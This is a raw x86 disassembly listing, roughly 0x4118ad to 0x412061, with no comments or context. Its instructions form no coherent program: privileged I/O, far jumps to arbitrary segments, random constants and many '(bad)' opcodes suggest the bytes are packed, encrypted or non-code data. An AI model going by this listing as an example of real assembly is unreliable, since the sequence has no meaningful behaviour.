  4118ad:	cmc    
  4118ae:	add    dh,BYTE PTR [ebx+0x6d]
  4118b1:	jns    0x4118d4
  4118b3:	sub    eax,0xf60c1b96
  4118b9:	ins    DWORD PTR es:[edi],dx
  4118ba:	je     0x411909
  4118bc:	pop    ds
  4118bd:	out    dx,eax
  4118be:	mov    dh,0x3c
  4118c0:	inc    edi
  4118c1:	jb     0x41193d
  4118c3:	jecxz  0x41189c
  4118c5:	mov    ecx,0xe71f05d5
  4118ca:	retf   0xb68a
  4118cd:	mov    al,al
  4118cf:	je     0x4118b3
  4118d1:	or     DWORD PTR [eax],0xe67b93ff
  4118d7:	sub    eax,esi
  4118d9:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4118db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118dc:	and    al,0x3e
  4118de:	aad    0x64
  4118e0:	jp     0x411922
  4118e2:	popa   
  4118e3:	pusha  
  4118e4:	jg     0x4118d8
  4118e6:	cmp    esi,ebx
  4118e8:	inc    eax
  4118e9:	popa   
  4118ea:	add    edx,ecx
  4118ec:	enterw 0x3e95,0xca
  4118f1:	cmp    BYTE PTR [edx-0x2c],ch
  4118f4:	loopne 0x41188e
  4118f6:	sub    bh,BYTE PTR [ebp+0x3b8e6980]
  4118fc:	loope  0x4118db
  4118fe:	int    0x81
  411900:	and    cl,BYTE PTR [edi]
  411902:	daa    
  411903:	(bad)  [ebp+0x34f90faa]
  411909:	pop    edi
  41190a:	int3   
  41190b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41190c:	jmp    0xa13c:0xdb37cc78
  411913:	adc    eax,0x2d006537
  411918:	or     BYTE PTR [edx-0xed85efc],dh
  41191e:	sub    ah,BYTE PTR [esi+0x64]
  411921:	mov    ch,0x1d
  411923:	cwde   
  411924:	sbb    DWORD PTR [eax+0x7d],0xffffffdc
  411928:	mov    al,ds:0x6264fb8e
  41192d:	cs push ebx
  41192f:	in     eax,dx
  411930:	enter  0xa6f8,0x80
  411934:	or     al,0x35
  411936:	pop    edi
  411937:	lds    esp,FWORD PTR [ebx+ebp*8-0x361097c6]
  41193e:	xchg   ecx,eax
  41193f:	adc    al,0x66
  411941:	xor    eax,0x92bee4fe
  411946:	xor    DWORD PTR [edi+0x79],0x6d
  41194a:	and    dl,0x8f
  41194d:	das    
  41194e:	fwait
  41194f:	cmp    esi,DWORD PTR [ebx-0x35]
  411952:	aad    0xfa
  411954:	arpl   WORD PTR [esi+0x65],di
  411957:	cmc    
  411958:	mov    edi,0x25646e8
  41195d:	imul   esp,ebx,0x9f7a19e7
  411963:	pop    ds
  411964:	or     DWORD PTR [edx+eiz*2+0x6f11f7c6],esp
  41196b:	cmp    edi,0x305f8bf7
  411971:	add    esp,ecx
  411973:	mov    ah,0x66
  411975:	shl    BYTE PTR [eax+0x2a],1
  411978:	gs dec edx
  41197a:	xchg   ecx,eax
  41197b:	cmp    ecx,ebx
  41197d:	jecxz  0x411910
  41197f:	cli    
  411980:	leave  
  411981:	ror    BYTE PTR [edi+0x58],cl
  411984:	push   ds
  411985:	sub    cl,cl
  411987:	shl    DWORD PTR [ecx-0x7e],0xe2
  41198b:	aam    0x5
  41198d:	push   es
  41198e:	sub    eax,0x5ee018a9
  411993:	scas   eax,DWORD PTR es:[edi]
  411994:	add    DWORD PTR [esi+0x5a],0x78
  411998:	dec    ecx
  411999:	add    DWORD PTR [ecx-0x61e4510a],eax
  41199f:	cld    
  4119a0:	mov    ds:0xca8271fe,eax
  4119a5:	cmp    al,BYTE PTR [ecx-0x54]
  4119a8:	imul   esp,DWORD PTR [edx],0xbc8ab0c2
  4119ae:	mov    edi,0x932f0dc
  4119b3:	pop    ebx
  4119b4:	push   ebx
  4119b5:	out    dx,eax
  4119b6:	sbb    al,0x81
  4119b8:	aaa    
  4119b9:	div    DWORD PTR [ebp-0x7014f31a]
  4119bf:	fnstsw WORD PTR [edx]
  4119c1:	mov    esi,0x34d354c1
  4119c6:	loopne 0x411a0f
  4119c8:	popf   
  4119c9:	test   BYTE PTR [esp+ebp*8-0x4260feb0],cl
  4119d0:	push   es
  4119d1:	add    DWORD PTR [ebx+0x78307f0d],ebp
  4119d7:	jb     0x411a51
  4119d9:	ret    0xd7ba
  4119dc:	cli    
  4119dd:	stc    
  4119de:	aam    0x84
  4119e0:	xchg   BYTE PTR [ecx+0x67d82ce8],dh
  4119e6:	xor    esp,0xd66a0f07
  4119ec:	dec    esi
  4119ed:	mov    ah,0x32
  4119ef:	mov    bl,0x9b
  4119f1:	imul   eax,DWORD PTR [eax],0x68
  4119f4:	sub    cl,BYTE PTR [edx+esi*1]
  4119f7:	loop   0x411a56
  4119f9:	mov    ds:0x1a1540fd,al
  4119fe:	or     al,0x48
  411a00:	pushf  
  411a01:	jno    0x4119a3
  411a03:	pop    esi
  411a04:	jb     0x41198b
  411a06:	mov    ds:0xe0c5e63a,al
  411a0b:	add    ebx,DWORD PTR [esi-0xd]
  411a0e:	jge    0x4119bd
  411a10:	inc    ecx
  411a11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a12:	ror    DWORD PTR [edx-0x12],0xba
  411a16:	dec    esp
  411a17:	pop    edx
  411a18:	adc    eax,DWORD PTR [ecx+0x0]
  411a1b:	xor    bh,BYTE PTR [eax-0x533dba80]
  411a21:	out    dx,al
  411a22:	jecxz  0x4119ae
  411a24:	cli    
  411a25:	mov    al,ds:0xeb82feb9
  411a2a:	ins    BYTE PTR es:[edi],dx
  411a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a2c:	and    ebx,ebp
  411a2e:	jmp    0x71f6a829
  411a33:	mov    DWORD PTR [eax],esp
  411a35:	jns    0x4119b7
  411a37:	fild   QWORD PTR [ebx+0x74]
  411a3a:	ds retf 0x205a
  411a3e:	mov    BYTE PTR [esi],ch
  411a40:	xchg   ebp,eax
  411a41:	mov    bl,0x57
  411a43:	cmp    BYTE PTR [ecx-0xdcd3e17],ch
  411a49:	cmp    al,0x9
  411a4b:	pop    edi
  411a4c:	repz rcr BYTE PTR [eax],1
  411a4f:	cdq    
  411a50:	in     eax,0x70
  411a52:	iret   
  411a53:	test   eax,0x3b4043ae
  411a58:	mov    eax,ds:0x502cc8e7
  411a5d:	mov    ecx,0xecde6a14
  411a62:	and    ah,BYTE PTR [ecx+0x2c0b59e3]
  411a68:	jo     0x411a04
  411a6a:	sub    DWORD PTR [edx],ebx
  411a6c:	mov    edx,ds
  411a6e:	cmp    esi,ebp
  411a70:	popf   
  411a71:	dec    ecx
  411a72:	and    esp,DWORD PTR [edi+0x2c]
  411a75:	repnz dec ebx
  411a77:	leave  
  411a78:	jno    0x411abc
  411a7a:	test   BYTE PTR [eax+ebx*1+0x2b541f14],ah
  411a81:	pop    edx
  411a82:	dec    ecx
  411a83:	sti    
  411a84:	int    0xc8
  411a86:	push   edx
  411a87:	push   ecx
  411a88:	dec    esp
  411a89:	dec    esi
  411a8a:	mov    esi,0x83123823
  411a8f:	dec    edi
  411a90:	add    DWORD PTR [ecx+edi*1],esi
  411a93:	inc    bh
  411a95:	repnz adc ah,BYTE PTR [esi]
  411a98:	sti    
  411a99:	lahf   
  411a9a:	leave  
  411a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a9c:	es out 0x29,eax
  411a9f:	pop    ss
  411aa0:	xor    BYTE PTR [esi+0x58146f86],cl
  411aa6:	pop    ds
  411aa7:	das    
  411aa8:	mov    ebp,0x8fbe935e
  411aad:	pop    ebp
  411aae:	add    al,0x9f
  411ab0:	cmp    BYTE PTR [edx+0x7d],dh
  411ab3:	cld    
  411ab4:	int    0xa9
  411ab6:	in     al,0xb3
  411ab8:	inc    esp
  411ab9:	pop    ds
  411aba:	push   ecx
  411abb:	loope  0x411a7a
  411abd:	jo     0x411a60
  411abf:	je     0x411a50
  411ac1:	popa   
  411ac2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ac3:	test   BYTE PTR [edx+0x52],bh
  411ac6:	shl    bh,0x3d
  411ac9:	jb     0x411a6f
  411acb:	dec    ebp
  411acc:	jg     0x411b09
  411ace:	and    bl,BYTE PTR [edi+0x30fbb225]
  411ad4:	popa   
  411ad5:	push   ds
  411ad6:	xchg   ecx,eax
  411ad7:	scas   eax,DWORD PTR es:[edi]
  411ad8:	in     al,0xf8
  411ada:	std    
  411adb:	lds    edx,FWORD PTR [ecx]
  411add:	retf   
  411ade:	inc    ebp
  411adf:	sub    BYTE PTR [ebx-0x6f],cl
  411ae2:	mov    cl,0xf9
  411ae4:	jmp    0x915d:0xab612735
  411aeb:	jmp    0xf2047e66
  411af0:	inc    esp
  411af1:	sbb    al,0x30
  411af3:	imul   edx,DWORD PTR [edi-0x66],0xffffffdf
  411af7:	mov    DWORD PTR [edi-0x67b8b343],ebp
  411afd:	lods   eax,DWORD PTR ds:[esi]
  411afe:	lock hlt 
  411b00:	inc    esp
  411b01:	or     al,BYTE PTR [edx+eax*8-0x49]
  411b05:	scas   al,BYTE PTR es:[edi]
  411b06:	pop    ebx
  411b07:	cdq    
  411b08:	add    DWORD PTR [ebp-0x76],ebx
  411b0b:	or     al,0x2b
  411b0d:	ror    DWORD PTR [edx+0x5faf4102],0x76
  411b14:	jno    0x411b54
  411b16:	int3   
  411b17:	sbb    DWORD PTR [edx],ecx
  411b19:	xchg   DWORD PTR [ecx+0x40],edi
  411b1c:	jp     0x411b7c
  411b1e:	inc    edx
  411b1f:	lods   al,BYTE PTR ds:[esi]
  411b20:	adc    ch,BYTE PTR [edx]
  411b22:	pop    eax
  411b23:	aad    0xc1
  411b25:	jno    0x411b3c
  411b27:	xchg   esi,eax
  411b28:	scas   al,BYTE PTR es:[edi]
  411b29:	fld    TBYTE PTR [edx+0x32]
  411b2c:	dec    edx
  411b2d:	cmp    DWORD PTR [ecx+esi*1+0x4a92ccbf],eax
  411b34:	jle    0x411b20
  411b36:	and    BYTE PTR [ebx-0x4bc07b70],dl
  411b3c:	push   ss
  411b3d:	cmp    esi,DWORD PTR [eax+0x32]
  411b40:	add    eax,0x96092046
  411b45:	or     eax,0xffffffec
  411b48:	mov    bl,0x3
  411b4a:	out    0x53,eax
  411b4c:	jns    0x411bb1
  411b4e:	hlt    
  411b4f:	inc    esp
  411b50:	out    0x8e,al
  411b52:	int    0xc7
  411b54:	in     eax,dx
  411b55:	mov    edi,0xa173c068
  411b5a:	ins    BYTE PTR es:[edi],dx
  411b5b:	cmovo  eax,DWORD PTR [eax]
  411b5e:	jmp    0xf7bb:0x721ccc63
  411b65:	repz fcmovu st,st(1)
  411b68:	int3   
  411b69:	popa   
  411b6a:	pop    es
  411b6b:	ret    0xbcb0
  411b6e:	pop    ebp
  411b6f:	scas   eax,DWORD PTR es:[edi]
  411b70:	xor    al,0x4b
  411b72:	std    
  411b73:	(bad)  
  411b74:	ds push cs
  411b76:	lds    ebp,FWORD PTR [ebp-0x307213fb]
  411b7c:	popf   
  411b7d:	fsub   st,st(2)
  411b7f:	and    eax,0x20b0c55
  411b84:	lods   eax,DWORD PTR ds:[esi]
  411b85:	mov    al,0x79
  411b87:	adc    al,0x74
  411b89:	loopne 0x411b4b
  411b8b:	jbe    0x411b2a
  411b8d:	push   esi
  411b8e:	xchg   DWORD PTR [ebp+0x403ea80b],esp
  411b94:	jmp    0x411b25
  411b96:	pop    es
  411b97:	xor    bl,bh
  411b99:	cli    
  411b9a:	nop
  411b9b:	adc    ebp,edx
  411b9d:	add    al,0x91
  411b9f:	dec    BYTE PTR [ebp-0x18]
  411ba2:	idiv   BYTE PTR [ecx-0x4d6eda3c]
  411ba8:	test   al,0x63
  411baa:	dec    edx
  411bab:	push   edi
  411bac:	js     0x411b87
  411bae:	jo     0x411b7d
  411bb0:	or     DWORD PTR [esi-0x3f],0xffffffaf
  411bb4:	push   edi
  411bb5:	test   BYTE PTR [ebx],ch
  411bb7:	ins    BYTE PTR es:[edi],dx
  411bb8:	or     al,BYTE PTR [ebx]
  411bba:	mov    cl,0x7a
  411bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bbd:	adc    cl,BYTE PTR [ebx-0x18725be9]
  411bc3:	cs pushf 
  411bc5:	aad    0xb7
  411bc7:	pop    esp
  411bc8:	adc    BYTE PTR [esi-0x403628d],bl
  411bce:	sub    BYTE PTR [ebp-0x428f6d65],dl
  411bd4:	inc    esi
  411bd5:	cmc    
  411bd6:	pop    esi
  411bd7:	sbb    BYTE PTR [ebx+0x10],0x9a
  411bdb:	mov    dh,0x64
  411bdd:	mov    al,ds:0x67b1b4fb
  411be2:	xchg   esp,eax
  411be3:	jmp    ebp
  411be5:	dec    esp
  411be6:	das    
  411be7:	inc    ebp
  411be8:	mov    cl,0xdc
  411bea:	mov    dl,0x22
  411bec:	adc    eax,0xab2c2b26
  411bf1:	cdq    
  411bf2:	stc    
  411bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bf4:	fcomip st,st(2)
  411bf6:	(bad)  
  411bf7:	fimul  DWORD PTR [esi-0xa]
  411bfa:	in     al,0x53
  411bfc:	mov    edi,0xb4c1aaf0
  411c01:	inc    ecx
  411c02:	imul   ecx,DWORD PTR [edi-0x54],0x64
  411c06:	or     cl,bh
  411c08:	or     al,0xb9
  411c0a:	push   eax
  411c0b:	div    DWORD PTR [ecx+0x45]
  411c0e:	mov    dl,0x54
  411c10:	xchg   ecx,eax
  411c11:	push   ds
  411c12:	inc    ebx
  411c13:	sub    ebp,ebx
  411c15:	sbb    dl,dh
  411c17:	mov    ah,0xf8
  411c19:	cmp    al,0x93
  411c1b:	outs   dx,BYTE PTR ds:[esi]
  411c1c:	bound  ecx,QWORD PTR [ebx-0x70]
  411c1f:	sbb    eax,0x75a97523
  411c24:	jecxz  0x411bac
  411c26:	or     esp,DWORD PTR [eax-0x47702bd9]
  411c2c:	pusha  
  411c2d:	in     eax,0x12
  411c2f:	sub    bh,ah
  411c31:	sub    ecx,DWORD PTR [eax]
  411c33:	adc    DWORD PTR [edx],ebx
  411c35:	cs test eax,0xc4313f1e
  411c3b:	cmp    bh,BYTE PTR [esi-0x1b]
  411c3e:	cmp    al,0xb2
  411c40:	add    ebx,ebx
  411c42:	rol    BYTE PTR [edi+0x3d],1
  411c45:	inc    ecx
  411c46:	mov    ecx,DWORD PTR [edx]
  411c48:	out    0x9f,al
  411c4a:	xor    al,0xec
  411c4c:	jp     0x411c07
  411c4e:	test   eax,0xbedb9c44
  411c53:	ja     0x411c79
  411c55:	sbb    BYTE PTR [ebp+0x70],dl
  411c58:	mov    ch,al
  411c5a:	cmp    eax,0x4a5527d
  411c5f:	ret    
  411c60:	xchg   dl,bl
  411c62:	mov    ah,0xa2
  411c64:	xor    DWORD PTR [edx-0x122665fa],0x3
  411c6b:	fcmove st,st(1)
  411c6d:	leave  
  411c6e:	add    edx,DWORD PTR [ebx-0x68c3e6b6]
  411c74:	imul   ecx,ebx,0xffffff9e
  411c77:	or     BYTE PTR [eax+0x3e],dh
  411c7a:	pop    ebx
  411c7b:	(bad)  
  411c7c:	out    0xa6,eax
  411c7e:	lea    eax,ds:0x6a0e864
  411c84:	popf   
  411c85:	not    BYTE PTR [esi-0x14cdfdf6]
  411c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c8c:	test   BYTE PTR [ecx+edx*4-0x10],dh
  411c90:	in     al,dx
  411c91:	push   ecx
  411c92:	xor    eax,0xd1d1f33a
  411c97:	inc    esi
  411c98:	jg     0x411c21
  411c9a:	push   0x6e0d7cd1
  411c9f:	div    ecx
  411ca1:	test   DWORD PTR [eiz*2+0x7288d126],edx
  411ca8:	ficom  WORD PTR [ebx-0x7c466ae5]
  411cae:	push   edx
  411caf:	fs repnz mov cl,0x8d
  411cb3:	pop    ebp
  411cb4:	popa   
  411cb5:	sbb    DWORD PTR [esp+ebx*1+0x389c77b5],ebx
  411cbc:	add    al,0xdf
  411cbe:	test   ch,dh
  411cc0:	test   BYTE PTR [ecx],dl
  411cc2:	cmp    al,0x8a
  411cc4:	(bad)  
  411cc5:	aas    
  411cc6:	call   FWORD PTR [ebp+eiz*8-0x45]
  411cca:	jecxz  0x411d1e
  411ccc:	js     0x411cb7
  411cce:	std    
  411ccf:	adc    ch,BYTE PTR [edx-0x653024c5]
  411cd5:	dec    ebp
  411cd6:	inc    ebp
  411cd7:	fs cmp al,0x76
  411cda:	sub    edx,DWORD PTR [edx-0x74]
  411cdd:	stc    
  411cde:	int3   
  411cdf:	xlat   BYTE PTR ds:[ebx]
  411ce0:	aam    0xbe
  411ce2:	mov    ecx,0xc046ec17
  411ce7:	or     al,0xbb
  411ce9:	mov    esi,0xe9376484
  411cee:	mov    ch,0x8e
  411cf0:	or     eax,edi
  411cf2:	out    dx,eax
  411cf3:	mov    ?,di
  411cf6:	lods   al,BYTE PTR ds:[esi]
  411cf7:	jmp    FWORD PTR [eax]
  411cf9:	aad    0xd3
  411cfb:	cs je  0x411d03
  411cfe:	xchg   edi,eax
  411cff:	cli    
  411d00:	lock and ah,BYTE PTR [eax-0x5a4e613d]
  411d07:	and    eax,0x5df7819b
  411d0c:	cmp    cl,al
  411d0e:	cwde   
  411d0f:	or     dl,0xaa
  411d12:	jle    0x411d6f
  411d14:	jmp    0x1177fb75
  411d19:	(bad)  
  411d1a:	pop    eax
  411d1b:	outs   dx,DWORD PTR ds:[esi]
  411d1c:	jns    0x411d8a
  411d1e:	sub    DWORD PTR [esi+0x22],0xea35c421
  411d25:	cmp    ah,BYTE PTR [edx]
  411d27:	imul   ebp,DWORD PTR [ebx+0xa61b7e9],0x2c
  411d2e:	adc    eax,0x5f956005
  411d33:	add    edi,eax
  411d35:	ja     0x411d37
  411d37:	sub    eax,0xc4c3c798
  411d3c:	add    al,ah
  411d3e:	rcl    BYTE PTR [ebx],cl
  411d40:	std    
  411d41:	cld    
  411d42:	dec    ebx
  411d43:	(bad)  
  411d44:	jle    0x411db6
  411d46:	add    ecx,DWORD PTR [edx-0x587b9dcd]
  411d4c:	cmp    al,0xc8
  411d4e:	in     eax,dx
  411d4f:	aam    0x83
  411d51:	mov    ch,0x96
  411d53:	sub    eax,0x2452e7f2
  411d58:	lds    esi,FWORD PTR [edx-0x7c7dee3]
  411d5e:	sbb    ebp,DWORD PTR [esi-0x156fb754]
  411d64:	or     dh,al
  411d66:	mov    bh,0x74
  411d68:	sub    ebp,DWORD PTR [eax-0x29a025b5]
  411d6e:	test   DWORD PTR [esi+0x4df6216f],0xf01fa2c5
  411d78:	mov    edx,0xf961db05
  411d7d:	mov    al,ds:0x7de6c6eb
  411d83:	out    dx,al
  411d84:	mov    bh,0x95
  411d86:	sub    edi,DWORD PTR [esi+0x20843034]
  411d8c:	push   edx
  411d8d:	or     ebx,0xffffffc3
  411d90:	pop    ebx
  411d91:	aas    
  411d92:	cmovo  eax,DWORD PTR [edi+0x51]
  411d96:	out    0xb6,eax
  411d98:	jne    0x411dac
  411d9a:	mov    dh,0x73
  411d9c:	push   0xffffffc9
  411d9e:	add    esp,DWORD PTR [ebx]
  411da0:	retf   0x8c57
  411da3:	cmp    al,0x38
  411da5:	mov    esi,0x578d8ddc
  411daa:	imul   ecx,DWORD PTR [ebx+0x6fe54d38],0xffffffdc
  411db1:	push   DWORD PTR [esi]
  411db3:	sbb    ebx,DWORD PTR [eax+0x2d2d0cae]
  411db9:	bswap  eax
  411dbb:	add    al,0x3d
  411dbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dbe:	adc    eax,0x1c77b93f
  411dc3:	xchg   BYTE PTR [ebx-0x5cea8351],bh
  411dc9:	stos   DWORD PTR es:[edi],eax
  411dca:	add    al,0x2b
  411dcc:	and    ecx,0xffffffab
  411dcf:	dec    ebp
  411dd0:	cwde   
  411dd1:	(bad)  
  411dd2:	cmp    eax,0xa2502303
  411dd7:	int    0x6c
  411dd9:	or     eax,0xfbd98bf2
  411dde:	sbb    al,bh
  411de0:	imul   ebx,DWORD PTR [eax+edx*2],0xbb8000dc
  411de7:	xor    DWORD PTR [edi],esi
  411de9:	ins    BYTE PTR es:[edi],dx
  411dea:	dec    edi
  411deb:	bound  edx,QWORD PTR [eax]
  411ded:	data16 (bad) 
  411def:	hlt    
  411df0:	jb     0x411e29
  411df2:	ins    DWORD PTR es:[edi],dx
  411df3:	or     al,bh
  411df5:	mov    ebx,0x12abb457
  411dfa:	adc    al,0xde
  411dfc:	jmp    0xc7acbfc8
  411e01:	push   ecx
  411e02:	and    ah,BYTE PTR [ebx-0x2a0baaaa]
  411e08:	cmc    
  411e09:	in     eax,dx
  411e0a:	stos   DWORD PTR es:[edi],eax
  411e0b:	ret    0xdcf7
  411e0e:	das    
  411e0f:	sbb    al,0x48
  411e11:	scas   al,BYTE PTR es:[edi]
  411e12:	mov    WORD PTR [eax],ss
  411e14:	sub    al,0x6e
  411e16:	adc    al,0xf1
  411e18:	pop    edx
  411e19:	sbb    BYTE PTR ds:0xee3b067b,dh
  411e1f:	cld    
  411e20:	arpl   WORD PTR [edi],sp
  411e22:	lds    edx,FWORD PTR [edi]
  411e24:	mov    WORD PTR [ebp-0x2b],?
  411e27:	xor    eax,0x8c441a7f
  411e2c:	or     al,0xd7
  411e2e:	dec    eax
  411e2f:	ror    DWORD PTR [edx],0x13
  411e32:	js     0x411e26
  411e34:	dec    edx
  411e35:	out    0xa1,al
  411e37:	fld    TBYTE PTR [ebx+0x6f]
  411e3a:	pop    DWORD PTR [edx+eiz*1]
  411e3d:	idiv   BYTE PTR [edx-0x7d44e8ff]
  411e43:	invd   
  411e45:	push   eax
  411e46:	daa    
  411e47:	add    BYTE PTR [ebx+0x176ae3e7],bl
  411e4d:	jmp    0xa45f:0xd547d93a
  411e54:	in     eax,0xc8
  411e56:	rcl    edi,1
  411e58:	fstp   QWORD PTR ds:0x90c09df5
  411e5e:	cmp    al,0x6f
  411e60:	aaa    
  411e61:	sti    
  411e62:	mov    esi,0xcfe563b5
  411e67:	call   0xd881:0x5211c851
  411e6e:	out    0xb9,al
  411e70:	ds test ecx,0x48ea527d
  411e77:	pop    edx
  411e78:	fs popf 
  411e7a:	data16 lods al,BYTE PTR ds:[esi]
  411e7c:	sbb    al,0x9a
  411e7e:	mov    esp,0x1f66bb28
  411e83:	in     eax,dx
  411e84:	ret    0x209f
  411e87:	std    
  411e88:	retf   
  411e89:	pop    ss
  411e8a:	div    BYTE PTR [eax+ecx*4-0x10]
  411e8e:	(bad)  
  411e8f:	pop    eax
  411e90:	jle    0x411e80
  411e92:	repz sub al,0x15
  411e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e96:	inc    ecx
  411e97:	sub    ecx,DWORD PTR [esp+esi*1+0x50d88729]
  411e9e:	sbb    al,0xdd
  411ea0:	in     al,0x6a
  411ea2:	(bad)  
  411ea3:	fdivr  QWORD PTR [ebp-0x390be597]
  411ea9:	xchg   DWORD PTR [edx+0x7e],eax
  411eac:	mov    ebx,0xc430dad8
  411eb1:	xlat   BYTE PTR ds:[ebx]
  411eb2:	into   
  411eb3:	retf   0x3f04
  411eb6:	pop    edx
  411eb7:	sti    
  411eb8:	jbe    0x411f03
  411eba:	test   DWORD PTR [esi-0x4ce7175b],ecx
  411ec0:	(bad)  
  411ec1:	(bad)  
  411ec2:	dec    DWORD PTR [edi+ebx*8]
  411ec5:	cmp    eax,0x5d00d23a
  411eca:	leave  
  411ecb:	cmp    eax,0x1f073dd6
  411ed0:	jno    0x411eec
  411ed2:	cmp    ebp,esi
  411ed4:	xor    cl,BYTE PTR [eax]
  411ed6:	add    ebx,ebp
  411ed8:	fucomp st(0)
  411eda:	pop    esp
  411edb:	cmc    
  411edc:	sub    al,0x5e
  411ede:	inc    eax
  411edf:	xor    ecx,DWORD PTR [edx-0x58]
  411ee2:	xor    esp,ecx
  411ee4:	sbb    ebx,DWORD PTR [ebx+0x75c2d3a0]
  411eea:	ret    
  411eeb:	mov    ch,0xb7
  411eed:	jge    0x411ed4
  411eef:	and    eax,0xa7473ff4
  411ef4:	sahf   
  411ef5:	xor    ebp,DWORD PTR [esi+0x1e32785f]
  411efb:	ret    0x4cec
  411efe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eff:	pop    es
  411f00:	loope  0x411f7d
  411f02:	retf   0x58b7
  411f05:	add    al,0x6a
  411f07:	call   0xd92c:0xa1e225db
  411f0e:	neg    DWORD PTR [esi+0x65]
  411f11:	pop    ebx
  411f12:	sub    BYTE PTR es:[ebx+eax*1+0x5b5f2134],cl
  411f1a:	push   edi
  411f1b:	sar    edi,0x45
  411f1e:	jmp    0x411f56
  411f20:	loope  0x411f03
  411f22:	retf   0xec92
  411f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f26:	push   ecx
  411f27:	rcl    DWORD PTR [edx-0x49],0x6f
  411f2b:	rep lods eax,DWORD PTR ds:[esi]
  411f2d:	sub    DWORD PTR [ecx+0xe519c8b],ecx
  411f33:	cmp    BYTE PTR [edi+edx*2],cl
  411f36:	add    BYTE PTR cs:[ebp-0x65],ah
  411f3a:	inc    ecx
  411f3b:	pop    ss
  411f3c:	jg     0x411efa
  411f3e:	sub    al,BYTE PTR [edi+0x2f]
  411f41:	push   esi
  411f42:	retf   0x39c4
  411f45:	push   es
  411f46:	nop
  411f47:	mov    fs,esp
  411f49:	outs   dx,DWORD PTR ds:[esi]
  411f4a:	outs   dx,BYTE PTR ds:[esi]
  411f4b:	push   0xa91fcb94
  411f50:	pop    edi
  411f51:	jae    0x411f6f
  411f53:	xor    al,0x22
  411f55:	pop    edi
  411f56:	addr16 sbb al,0x92
  411f59:	cmp    al,0xf3
  411f5b:	aam    0x64
  411f5d:	sbb    eax,0x15ca087
  411f62:	mov    al,0x21
  411f64:	ja     0x411f19
  411f66:	rcl    ch,1
  411f68:	or     eax,0xaae1a630
  411f6d:	push   ebx
  411f6e:	call   ebx
  411f70:	les    ebp,FWORD PTR ds:0x9beb68a1
  411f76:	jb     0x411f3d
  411f78:	mov    eax,ds:0x706d63e7
  411f7d:	retf   0x9aae
  411f80:	scas   al,BYTE PTR es:[edi]
  411f81:	or     eax,0xce88cc1e
  411f86:	shr    bl,1
  411f88:	cmc    
  411f89:	fwait
  411f8a:	adc    esp,DWORD PTR [ebp*2-0x32e5c316]
  411f91:	ficom  DWORD PTR [ecx+0x72841246]
  411f97:	ror    BYTE PTR [ebx+0x48],1
  411f9a:	lahf   
  411f9b:	daa    
  411f9c:	imul   DWORD PTR [ebp-0x2]
  411f9f:	or     ebp,DWORD PTR [edx+ecx*8-0x4b12142a]
  411fa6:	iret   
  411fa7:	hlt    
  411fa8:	sub    dh,ah
  411faa:	test   bh,bh
  411fac:	and    al,0x22
  411fae:	push   esp
  411faf:	test   DWORD PTR [edi+0x23f64bbe],eax
  411fb5:	iret   
  411fb6:	daa    
  411fb7:	sbb    DWORD PTR [ebp+0x70],0x96f5d01d
  411fbe:	mov    bh,0x92
  411fc0:	das    
  411fc1:	lds    edx,FWORD PTR [ebx-0x8]
  411fc4:	in     al,dx
  411fc5:	test   eax,0x11f3fa0b
  411fca:	out    dx,al
  411fcb:	out    0xb4,eax
  411fcd:	dec    eax
  411fce:	push   0xffffffc0
  411fd0:	shr    BYTE PTR [ebx-0x7d],0x99
  411fd4:	les    esi,FWORD PTR [edi-0x57f7694a]
  411fda:	jno    0x412010
  411fdc:	dec    ebp
  411fdd:	pop    esp
  411fde:	sar    esp,1
  411fe0:	adc    eax,0xc88f82c5
  411fe5:	inc    edi
  411fe6:	mov    dl,0xbc
  411fe8:	push   eax
  411fe9:	mov    dh,0x11
  411feb:	jnp    0x41200c
  411fed:	adc    ebp,esp
  411fef:	pop    ss
  411ff0:	enter  0x7438,0x1b
  411ff4:	push   ebx
  411ff5:	xor    bh,BYTE PTR [ecx]
  411ff7:	nop
  411ff8:	jnp    0x41205f
  411ffa:	mov    DWORD PTR [eax],ecx
  411ffc:	retf   0xa0c9
  411fff:	inc    edi
  412000:	loop   0x411fc8
  412002:	adc    edx,DWORD PTR [edi+0x60]
  412005:	add    DWORD PTR [ecx+esi*4-0x6b],0x13
  41200a:	and    edi,DWORD PTR [ebp+0x2]
  41200d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41200e:	aad    0x5d
  412010:	addr16 (bad) 
  412012:	enter  0x9e34,0x1f
  412016:	pop    DWORD PTR [eax+0x4a]
  412019:	mov    esi,0x78f5d619
  41201e:	xchg   edi,eax
  41201f:	push   0x4b
  412021:	addr16 sbb ah,cl
  412024:	unpcklps xmm4,XMMWORD PTR [ecx]
  412027:	dec    edi
  412028:	scas   eax,DWORD PTR es:[edi]
  412029:	sub    al,0xb0
  41202b:	scas   al,BYTE PTR es:[edi]
  41202c:	mov    DWORD PTR [esi-0x6895e6a8],edi
  412032:	inc    ebx
  412033:	xor    eax,0x3b8cfcd5
  412038:	jl     0x41200b
  41203a:	push   es
  41203b:	jmp    0x41205f
  41203d:	sub    eax,0x1b7b442f
  412042:	mov    dl,BYTE PTR [esi-0x3d]
  412045:	push   esi
  412046:	xchg   DWORD PTR [edi],ebp
  412048:	lods   eax,DWORD PTR ds:[esi]
  412049:	ror    DWORD PTR [ecx+0x5b],1
  41204c:	cmp    ebx,ebx
  41204e:	cmp    edx,edi
  412050:	xchg   ecx,eax
  412051:	les    eax,FWORD PTR [edx]
  412053:	iret   
  412054:	cli    
  412055:	outs   dx,BYTE PTR ds:[esi]
  412056:	fisubr DWORD PTR [ebx+ebx*1]
  412059:	aas    
  41205a:	jg     0x412095
  41205c:	ficomp WORD PTR [ebx+eiz*4-0x4e]
  412060:	(bad)  
  412061:	adc    ecx,ebp
